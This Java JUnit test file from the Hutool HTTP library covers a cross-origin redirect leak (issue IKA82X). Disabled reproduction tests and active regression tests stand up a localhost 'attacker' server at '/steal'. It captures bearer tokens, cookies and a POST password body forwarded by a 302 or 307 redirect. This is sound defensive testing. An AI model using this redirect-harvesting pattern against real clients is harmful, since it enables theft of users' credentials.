package cn.hutool.http;

import com.sun.net.httpserver.HttpServer;
import org.junit.jupiter.api.Disabled;
import org.junit.jupiter.api.Test;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.net.InetSocketAddress;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.atomic.AtomicReference;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertNull;

/**
 * HttpRequest 跨源重定向敏感信息泄漏问题（issue#IKA82X@Gitee）测试。
 * <p>
 * 包含两类测试：复现测试（{@link Disabled}，修复前可复现漏洞）与回归测试（修复后验证敏感信息不再泄漏）。
 */
public class IssueIKA82XTest {

	// ------------------------------------------------------------------ 复现测试（修复前可复现）

	@Test
	@Disabled("漏洞修复前用于复现，修复后此测试会失败")
	public void sensitiveHeaderLeakReproduceTest() throws Exception {
		final AtomicReference<String> leakedAuthorization = new AtomicReference<>();
		final AtomicReference<String> leakedCookie = new AtomicReference<>();
		final HttpServer attacker = HttpServer.create(new InetSocketAddress(0), 0);
		attacker.createContext("/steal", exchange -> {
			leakedAuthorization.set(exchange.getRequestHeaders().getFirst("Authorization"));
			leakedCookie.set(exchange.getRequestHeaders().getFirst("Cookie"));
			exchange.sendResponseHeaders(200, -1);
			exchange.close();
		});
		attacker.start();

		final HttpServer origin = HttpServer.create(new InetSocketAddress(0), 0);
		final String attackerUrl = "http://localhost:" + attacker.getAddress().getPort() + "/steal";
		origin.createContext("/", exchange -> {
			exchange.getResponseHeaders().set("Location", attackerUrl);
			exchange.sendResponseHeaders(302, -1);
			exchange.close();
		});
		origin.start();

		HttpRequest.get("http://localhost:" + origin.getAddress().getPort() + "/")
				.bearerAuth("SUPER_SECRET_TOKEN")
				.cookie("sessionid=VERY_SENSITIVE_COOKIE")
				.setFollowRedirects(true)
				.execute();

		assertEquals("Bearer SUPER_SECRET_TOKEN", leakedAuthorization.get());
		assertEquals("sessionid=VERY_SENSITIVE_COOKIE", leakedCookie.get());

		origin.stop(0);
		attacker.stop(0);
	}

	@Test
	@Disabled("漏洞修复前用于复现，修复后此测试会失败")
	public void postBodyLeakReproduceTest() throws Exception {
		final AtomicReference<String> leakedMethod = new AtomicReference<>();
		final AtomicReference<String> leakedBody = new AtomicReference<>();
		final HttpServer attacker = HttpServer.create(new InetSocketAddress(0), 0);
		attacker.createContext("/steal", exchange -> {
			leakedMethod.set(exchange.getRequestMethod());
			try {
				leakedBody.set(new String(readAll(exchange.getRequestBody()), StandardCharsets.UTF_8));
			} catch (Exception e) {
				throw new RuntimeException(e);
			}
			exchange.sendResponseHeaders(200, -1);
			exchange.close();
		});
		attacker.start();

		final HttpServer origin = HttpServer.create(new InetSocketAddress(0), 0);
		final String attackerUrl = "http://localhost:" + attacker.getAddress().getPort() + "/steal";
		origin.createContext("/", exchange -> {
			exchange.getResponseHeaders().set("Location", attackerUrl);
			exchange.sendResponseHeaders(307, -1);
			exchange.close();
		});
		origin.start();

		HttpRequest.post("http://localhost:" + origin.getAddress().getPort() + "/")
				.body("username=admin&password=SecretPass123!")
				.setFollowRedirects(true)
				.execute();

		assertEquals("POST", leakedMethod.get());
		assertEquals("username=admin&password=SecretPass123!", leakedBody.get());

		origin.stop(0);
		attacker.stop(0);
	}

	// ------------------------------------------------------------------ 回归测试（修复后验证）

	@Test
	public void sensitiveHeaderNotLeakTest() throws Exception {
		final AtomicReference<String> leakedAuthorization = new AtomicReference<>();
		final AtomicReference<String> leakedCookie = new AtomicReference<>();
		final HttpServer attacker = HttpServer.create(new InetSocketAddress(0), 0);
		attacker.createContext("/steal", exchange -> {
			leakedAuthorization.set(exchange.getRequestHeaders().getFirst("Authorization"));
			leakedCookie.set(exchange.getRequestHeaders().getFirst("Cookie"));
			exchange.sendResponseHeaders(200, -1);
			exchange.close();
		});
		attacker.start();

		final HttpServer origin = HttpServer.create(new InetSocketAddress(0), 0);
		final String attackerUrl = "http://localhost:" + attacker.getAddress().getPort() + "/steal";
		origin.createContext("/", exchange -> {
			exchange.getResponseHeaders().set("Location", attackerUrl);
			exchange.sendResponseHeaders(302, -1);
			exchange.close();
		});
		origin.start();

		HttpRequest.get("http://localhost:" + origin.getAddress().getPort() + "/")
				.bearerAuth("SUPER_SECRET_TOKEN")
				.cookie("sessionid=VERY_SENSITIVE_COOKIE")
				.setFollowRedirects(true)
				.execute();

		assertNull(leakedAuthorization.get());
		assertNull(leakedCookie.get());

		origin.stop(0);
		attacker.stop(0);
	}

	@Test
	public void postBodyNotLeakTest() throws Exception {
		final AtomicReference<String> leakedMethod = new AtomicReference<>();
		final AtomicReference<String> leakedBody = new AtomicReference<>();
		final HttpServer attacker = HttpServer.create(new InetSocketAddress(0), 0);
		attacker.createContext("/steal", exchange -> {
			leakedMethod.set(exchange.getRequestMethod());
			try {
				final byte[] bytes = readAll(exchange.getRequestBody());
				leakedBody.set(bytes.length == 0 ? null : new String(bytes, StandardCharsets.UTF_8));
			} catch (Exception e) {
				throw new RuntimeException(e);
			}
			exchange.sendResponseHeaders(200, -1);
			exchange.close();
		});
		attacker.start();

		final HttpServer origin = HttpServer.create(new InetSocketAddress(0), 0);
		final String attackerUrl = "http://localhost:" + attacker.getAddress().getPort() + "/steal";
		origin.createContext("/", exchange -> {
			exchange.getResponseHeaders().set("Location", attackerUrl);
			exchange.sendResponseHeaders(307, -1);
			exchange.close();
		});
		origin.start();

		HttpRequest.post("http://localhost:" + origin.getAddress().getPort() + "/")
				.body("username=admin&password=SecretPass123!")
				.setFollowRedirects(true)
				.execute();

		assertEquals("POST", leakedMethod.get());
		assertNull(leakedBody.get());

		origin.stop(0);
		attacker.stop(0);
	}

	private static byte[] readAll(final InputStream in) throws Exception {
		final ByteArrayOutputStream out = new ByteArrayOutputStream();
		final byte[] buffer = new byte[4096];
		int n;
		while ((n = in.read(buffer)) != -1) {
			out.write(buffer, 0, n);
		}
		return out.toByteArray();
	}
}
